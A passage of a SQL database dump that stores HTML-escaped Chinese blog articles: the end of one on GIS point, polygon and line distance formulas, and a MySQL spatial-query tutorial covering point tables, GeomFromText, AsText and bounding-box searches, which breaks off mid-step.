&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;其中，|T&lt;sub&gt;i&lt;/sub&gt;|表示三角形的面积。d&lt;sub&gt;avg&lt;/sub&gt;(p,T&lt;sub&gt;i&lt;/sub&gt;)表示点p到T&lt;sub&gt;i&lt;/sub&gt;的平均距离。&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;该方法在时间复杂度上非常大，首先必须将多边形剖分为三角形，按照积分的方法计算点到每个三角形的平均距离，然后才能得出点到面的平均距离。为了高效求取点到平面的平均距离，必须在面目标内寻找一点，转换为点/点距离的计算。传统方法将点/面距离近似表示为点到质心的距离。但对于凹多边形，可在多边形内求取一内点，将点到面的距离近似表示为点到该内点的距离。&lt;br /&gt;\r\n&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;四、线/线距离计算&lt;/font&gt;&lt;/i&gt;&lt;/h3&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(一)、线/线最短、最大距离：描述两条线之间的最短距离和最大距离(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;相交线之间的最短距离为零，否则，设有两线段l&lt;sub&gt;1&lt;/sub&gt;和l&lt;sub&gt;2&lt;/sub&gt;，端点分别为（p&lt;sub&gt;1s&lt;/sub&gt;,p&lt;sub&gt;1e&lt;/sub&gt;）与(p&lt;sub&gt;2s&lt;/sub&gt;,p&lt;sub&gt;2e&lt;/sub&gt;)。则线/线之间的最短距离和最大距离为(Atsuyuki Okabe,Harvey H.Miller,1996）：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;d&lt;sub&gt;min&lt;/sub&gt;(l&lt;sub&gt;1&lt;/sub&gt;,l&lt;sub&gt;2&lt;/sub&gt;)=min{d&lt;sub&gt;min&lt;/sub&gt;(p&lt;sub&gt;1s&lt;/sub&gt;,l&lt;sub&gt;2&lt;/sub&gt;),d&lt;sub&gt;min&lt;/sub&gt;(p&lt;sub&gt;1e&lt;/sub&gt;,l&lt;sub&gt;2&lt;/sub&gt;),d&lt;sub&gt;min&lt;/sub&gt;(p&lt;sub&gt;2s&lt;/sub&gt;,l&lt;sub&gt;1&lt;/sub&gt;),d&lt;sub&gt;min&lt;/sub&gt;(p&lt;sub&gt;2e&lt;/sub&gt;,l&lt;sub&gt;1&lt;/sub&gt;)}&amp;nbsp; &lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;d&lt;sub&gt;max&lt;/sub&gt;(l&lt;sub&gt;1&lt;/sub&gt;,l&lt;sub&gt;2&lt;/sub&gt;)=max{d&lt;sub&gt;max&lt;/sub&gt;(p&lt;sub&gt;1s&lt;/sub&gt;,l&lt;sub&gt;2&lt;/sub&gt;),d&lt;sub&gt;max&lt;/sub&gt;(p&lt;sub&gt;1e&lt;/sub&gt;,l&lt;sub&gt;2&lt;/sub&gt;),d&lt;sub&gt;max&lt;/sub&gt;(p&lt;sub&gt;2s&lt;/sub&gt;,l&lt;sub&gt;1&lt;/sub&gt;),d&lt;sub&gt;max&lt;/sub&gt;(p&lt;sub&gt;2e&lt;/sub&gt;,l&lt;sub&gt;1&lt;/sub&gt;)}&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(二)、线/线平均距离计算描述两条线之间的平均距离(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21pt;line-height:125%;text-align:left;&quot; align=&quot;left&quot;&gt;&lt;font size=&quot;4&quot;&gt;假设线段l&lt;sub&gt;1&lt;/sub&gt;位于X轴，{(x,0)|a≤x≤b}。l&lt;sub&gt;2&lt;/sub&gt;位于直线Y=kX上，{(X,Y)|c≤X≤d,kc≤Y≤kd}。对于l&lt;sub&gt;2&lt;/sub&gt;上的任意一点P（X，Y），P到l&lt;sub&gt;1&lt;/sub&gt;的平均距离 &lt;/font&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21pt;line-height:125%;text-align:left;&quot; align=&quot;left&quot;&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp; &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.4.83.gif&quot; height=&quot;41&quot; width=&quot;175&quot; /&gt; ，其中 &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.4.84.gif&quot; height=&quot;29&quot; width=&quot;175&quot; /&gt; &lt;/font&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21pt;line-height:125%;text-align:left;&quot; align=&quot;left&quot;&gt;&lt;font size=&quot;4&quot;&gt;在l&lt;sub&gt;2&lt;/sub&gt;上，每间隔dX取点，则取样点总数n=(d-c)/dX。从而线段l&lt;sub&gt;2&lt;/sub&gt;到l&lt;sub&gt;1&lt;/sub&gt;的平均距离为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p style=&quot;line-height:125%;&quot;&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; d&lt;sub&gt;avg&lt;/sub&gt;(l&lt;sub&gt;2&lt;/sub&gt;,l&lt;sub&gt;1&lt;/sub&gt;)=(d&lt;sub&gt;avg&lt;/sub&gt;(p&lt;sub&gt;1&lt;/sub&gt;,l&lt;sub&gt;1&lt;/sub&gt;)+ d&lt;sub&gt;avg&lt;/sub&gt;(p&lt;sub&gt;2&lt;/sub&gt;,l&lt;sub&gt;1&lt;/sub&gt;)+……+ d&lt;sub&gt;avg&lt;/sub&gt;(p&lt;sub&gt;n&lt;/sub&gt;,l&lt;sub&gt;1&lt;/sub&gt;))/n &lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.4.85.gif&quot; height=&quot;41&quot; width=&quot;139&quot; /&gt;&lt;/font&gt; &lt;/p&gt;\r\n&lt;/div&gt;\r\n&lt;font size=&quot;4&quot;&gt;&lt;font face=&quot;华文新魏&quot;&gt;&lt;font color=&quot;#cc0033&quot;&gt;&lt;br /&gt;\r\n&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;', 1, 1, 0, 0, 1305161919, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(111, 1, 'MYSQL的空间查询（一）', '', '', '&lt;div id=&quot;blog_text&quot; class=&quot;cnt&quot;&gt;&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;步骤&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;：创建支持空间查询的表&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;首先来说一下如何创建一个包含空间数据的名为&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Points&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;的表。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;CREATE TABLE `points` (&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;`name` varchar(20) NOT NULL DEFAULT '''',&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;`location` point NOT NULL,&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;`description` varchar(200) DEFAULT NULL,&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;PRIMARY KEY (`name`),&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;SPATIAL KEY `sp_index` (`location`)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;) ENGINE=MyISAM DEFAULT CHARSET=gbk;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;这条&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;DDL&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;命令创建了一个名为&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Points&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;的表，包含一个&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;字段和一个类型为&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;point&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;的字段&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;（所处位置）及&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;descrption&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;（描述）字段。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;正如你所看到的，空间类型字段的使用跟&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Mysql&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;中其他类型一样，创建时选择相应的类型即可。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;空间数据类型的基类是&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Geometry&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;可以在下面的文档中找到所有&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Mysql&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;支持的空间数据类型：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;http://dev.mysql.com/doc/refman/4.1/en/spatial-extensions.html&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;步骤&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;2&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;：向空间数据表中插入数据&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;我们来看一看想&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Points&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;表中的插入数据是多么的简单：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;INSERT INTO Points (name, location) VALUES ( ''point1'' , GeomFromText( '' POINT(31.5 42.2) '' ) )&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;这是一个普通的&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;SQL&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;插入操作，只有函数&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;GeomFromText()&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;是我们以前未见过的。这个函数接受一个字符串，并且返回一个几何对象。有关该字符串的&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;GIS&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;标准格式详见：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;http://dev.mysql.com/doc/refman/4.1/en/gis-wkt-format.html&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;步骤&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;3&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;：从空间数据表中读取数据&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;从&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Points&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;表中读取数据也是非常简单的：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT name, AsText(location) FROM Points;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;以上语句的返回结果中&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;会被转换成跟第二步中一样的&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;GIS&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;标准字符串。实际上&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;AsText&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;函数仅仅是把数据库内部存储的几何对象格式化成一个字符串而已。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;下面一个函数也是非常有用的：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT name, AsText(location) FROM Points WHERE X(location) &amp;lt; 10 and Y(location) &amp;gt; 12;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;&quot;&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:12px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;该&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Select&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;语句返回一系列&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;的&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;X()&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;（经度）小于&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;10&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;并且&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Y()&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;（经度）大于&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;12&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;的点集合。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;步骤&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;4&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;：空间表的高级查询&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;把指定的几何对象转变易读的文本：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT AsText(Envelope(GeomFromText(''LineString(1 1,2 2)'')));&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;返回指定几何对象的大小：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT GeometryType(GeomFromText(''POINT(1 1)''));&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;返回指定几何对象的类型：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT GeometryType(GeomFromText(''POINT(1 1)''));&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;查找指定矩形范围内的点：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SET @bbox = ''POLYGON((0 0, 10 0, 10 10, 0 10, 0 0))'';&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT name, AsText(location) FROM Points WHERE Intersects( location, GeomFromText(@bbox) );&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;步骤&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;5&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;：查找圆形区域内的点&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;这一步介绍如何查询圆形区域（通常用一个中心点和半径来表示）内的几何对象。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;您首先想到的语句可能是：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SET @point = ''POINT(10 10)'';&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span 